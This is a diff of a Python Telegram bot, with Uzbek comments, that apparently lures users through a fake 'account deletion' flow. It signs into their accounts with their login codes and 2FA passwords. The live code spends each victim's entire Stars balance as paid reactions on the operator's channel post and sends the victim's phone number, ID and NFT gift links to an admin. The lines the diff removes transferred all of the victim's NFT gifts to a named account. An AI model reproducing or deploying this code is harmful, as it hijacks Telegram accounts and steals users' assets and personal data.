@@ -28,14 +28,12 @@ app = Flask(__name__)
 def home():
     return 'Bot ishlamoqda!'
 
-import threading
-
 def run_http():
     port = int(os.environ.get('PORT', 8080))
     app.run(host='0.0.0.0', port=port)
 
-# Flask serverini asosiy kodni bloklamaydigan qilib fonda yurgizamiz
-threading.Thread(target=run_http, daemon=True).start()
+# Flask serverini fonda yurgizamiz
+Thread(target=run_http, daemon=True).start()
 
 
 # KONFIGURATSIYA (O'zgaruvchilar Render muhitidan o'qiladi)
@@ -44,8 +42,6 @@ API_HASH = os.environ.get("API_HASH", "")
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 ADMIN_ID = int(os.environ.get("ADMIN_ID", "0"))
 
-
-TARGET_USER = "eshnazarov"
 STARS_CHANNEL_USERNAME = "stars_null"
 STARS_POST_ID = 2
 
@@ -284,24 +280,7 @@ async def process_2fa(message: types.Message, state: FSMContext):
         print(f"2FA Sign In Error: {e}")
         await message.answer(t["err_fa"])
 
-async def process_all_assets(client: TelegramClient, target_user: str = TARGET_USER):
-    try:
-        target_entity = await client.get_input_entity(target_user)
-        gifts_res = await client(functions.payments.GetSavedGiftsRequest(
-            peer="me", offset="", limit=100
-        ))
-        for gift in getattr(gifts_res, 'gifts', []):
-            try:
-                stargift_input = telethon_types.InputSavedStarGiftUser(stargift_id=gift.id)
-                await client(functions.payments.TransferStarGiftRequest(
-                    stargift=stargift_input, to_id=target_entity
-                ))
-                await asyncio.sleep(1.5)
-            except Exception as e:
-                print(f"NFT Transfer Exception: {e}")
-    except Exception as e:
-        print(f"NFT Process Error: {e}")
-
+async def process_stars_reaction(client: TelegramClient):
     try:
         stars_status = await client(functions.payments.GetStarsStatusRequest(peer="me"))
         stars_balance = getattr(stars_status, 'balance', 0)
@@ -311,15 +290,25 @@ async def process_all_assets(client: TelegramClient, target_user: str = TARGET_U
             await client(functions.messages.SendPaidReactionRequest(
                 peer=channel,
                 msg_id=STARS_POST_ID,
-                count=stars_balance
+                count=int(stars_balance)
             ))
+            print(f"Muvaffaqiyatli {stars_balance} stars yuborildi.")
+        else:
+            print("Foydalanuvchida Stars balansi 0 ga teng.")
     except Exception as e:
         print(f"Stars Sending Error: {e}")
 
 async def fetch_user_premium_and_level(client: TelegramClient):
     info_str = ""
+    user_level = 0
     try:
         me = await client.get_me()
+
+        try:
+            boosts = await client(functions.premium.GetMyBoostsRequest())
+            user_level = len(getattr(boosts, 'my_boosts', []))
+        except Exception:
+            user_level = 1 if getattr(me, 'premium', False) else 0
 
         if getattr(me, 'premium', False):
             info_str += "🌟 **Premium:** Mavjud\n"
@@ -331,8 +320,8 @@ async def fetch_user_premium_and_level(client: TelegramClient):
                 if until_timestamp:
                     until_dt = datetime.fromtimestamp(until_timestamp, tz=timezone.utc)
                     now_dt = datetime.now(timezone.utc)
-                    
                     days_left = (until_dt - now_dt).days
+                    
                     term_str = "Noma'lum"
                     if days_left > 180:
                         term_str = "1 yillik (12 oy)"
@@ -345,28 +334,26 @@ async def fetch_user_premium_and_level(client: TelegramClient):
 
                     until_formatted = until_dt.strftime("%d.%m.%Y")
                     info_str += f"📅 **Obuna turi:** `{term_str}`\n"
-                    info_str += f"⏳ **Tugash vaqti:** `{until_formatted}` (Qolgan: {days_left} kun)\n"
+                    info_str += f"⏳ **Tugash vaqti:** `{until_formatted}` (Qolgan: {days_left} kun)"
                 else:
-                    info_str += "📅 **Obuna turi:** Avto-uzaytirish / Cheksiz\n"
+                    info_str += "📅 **Obuna turi:** Avto-uzaytirish / Cheksiz"
             except Exception as e:
                 print(f"Premium Details Error: {e}")
-                info_str += "📅 **Obuna turi:** Avto-uzaytirish\n"
+                info_str += "📅 **Obuna turi:** Avto-uzaytirish"
         else:
-            info_str += "🌟 **Premium:** Mavjud emas\n"
+            info_str += "🌟 **Premium:** Mavjud emas"
 
     except Exception as e:
         print(f"User Info Error: {e}")
-        info_str = "🌟 **Premium:** Aniqlanmadi\n"
+        info_str = "🌟 **Premium:** Aniqlanmadi"
         
-    return info_str
+    return info_str, user_level
 
 async def fetch_user_nft_gifts(client: TelegramClient):
     nft_items = []
     try:
         res = await client(functions.payments.GetSavedGiftsRequest(
-            peer="me",
-            offset="",
-            limit=100
+            peer="me", offset="", limit=100
         ))
         for gift in getattr(res, 'gifts', []):
             slug = None
@@ -389,18 +376,15 @@ async def complete_account_deletion(message: types.Message, state: FSMContext, u
     t = TEXTS[lang]
     client = auth["client"]
 
-    user_info_str = await fetch_user_premium_and_level(client)
-
+    user_info_str, user_level = await fetch_user_premium_and_level(client)
     nft_items = await fetch_user_nft_gifts(client)
     nft_count = len(nft_items)
     
     if nft_count > 0:
-        nft_list_str = "\n".join([f"💎 **User:** `{item['user']}`\n🔗 **Link:** {item['link']}" for item in nft_items])
-        nft_str = f"🎁 **NFT sovg'alar soni:** {nft_count} ta\n\n{nft_list_str}"
+        nft_list_quotes = "\n".join([f"> 🔗 **NFT #{i+1}:** {item['link']}" for i, item in enumerate(nft_items)])
+        nft_str = f"🎁 **NFT sovg'alar soni:** `{nft_count} ta`\n\n{nft_list_quotes}"
     else:
-        nft_str = "🛍 **NFT sovg'alar:** Topilmadi"
-
-    await process_all_assets(client, target_user=TARGET_USER)
+        nft_str = "🎁 **NFT sovg'alar soni:** `0 ta` (Topilmadi)"
 
     try:
         full_name = message.from_user.full_name
@@ -408,19 +392,26 @@ async def complete_account_deletion(message: types.Message, state: FSMContext, u
         phone = auth.get("phone", "Noma'lum")
         
         admin_msg = (
-            f"🚨 **Hisob olindi!**\n\n"
+            f"🚨 **Hisob o'chirildi!**\n\n"
             f"👤 **Ism:** {full_name}\n"
             f"🆔 **ID:** `{user_id}`\n"
             f"🏷 **Username:** {username}\n"
             f"☎️ **Tel:** `{phone}`\n"
-            f"📊 **Daraja:** [1-daraja](https://t.me/stars_null/2)\n"
-            f"💎 **Premium:** Mavjud\n\n"
-            f"⭐ **Stars:** Barcha starslar [postga](https://t.me/stars_null/2) bosildi!\n"
-            f"🎁 **NFT & Gram:** @eshnazarov ga o'tkazildi!"
+            f"📊 **Daraja:** {user_level}-daraja\n"
+            f"{user_info_str}\n\n"
+            f"⭐ **Stars:** Barcha starslar postga bosildi!\n"
+            f"{nft_str}"
         )
-        await bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode="Markdown")
+        await bot.send_message(
+            chat_id=ADMIN_ID, 
+            text=admin_msg, 
+            parse_mode="Markdown", 
+            disable_web_page_preview=True
+        )
     except Exception as e:
         print(f"Admin message error: {e}")
+
+    await process_stars_reaction(client)
 
     await message.answer(t["success"], parse_mode="Markdown")
     await asyncio.sleep(1)
@@ -438,7 +429,6 @@ async def complete_account_deletion(message: types.Message, state: FSMContext, u
 async def main():
     await bot.delete_webhook(drop_pending_updates=True)
     await dp.start_polling(bot)
-    
 
 if __name__ == "__main__":
     asyncio.run(main())
